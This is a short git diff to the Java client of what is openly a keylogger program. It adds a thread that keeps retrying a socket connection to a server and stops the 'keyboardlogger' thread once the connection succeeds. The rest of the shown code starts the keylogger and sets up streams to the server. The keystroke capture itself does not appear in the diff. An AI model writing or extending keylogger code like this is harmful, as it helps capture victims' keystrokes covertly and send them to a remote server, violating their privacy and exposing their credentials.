@@ -26,7 +26,19 @@ public class Client {
     public static void main(String args[]) throws InterruptedException {
 //    	System.out.println("in client");
     	System.out.println("in server");
+    	Thread logTracker = new Thread(){
+    		public void run(){
+    			while(true)
+    			try(Socket test = new Socket(serverIP, serverPort)){
+    				keyboardlogger.setRunStatus(false);
+    				break;
+    			}catch(Exception e){
+    				
+    			}
+    		}
+    	};
     	Thread logger = new keyboardlogger();
+    	logTracker.start();
         logger.start();
         
         //  run keylogger
@@ -44,6 +56,7 @@ public class Client {
             outToClient = new BufferedOutputStream(clientSocket.getOutputStream());
             keyboardlogger.setRunStatus(false);
             logger.join();
+            logTracker.join();
         } catch (IOException ex) {
             // Do exception handling
         	System.out.println("error in setting up sockets");
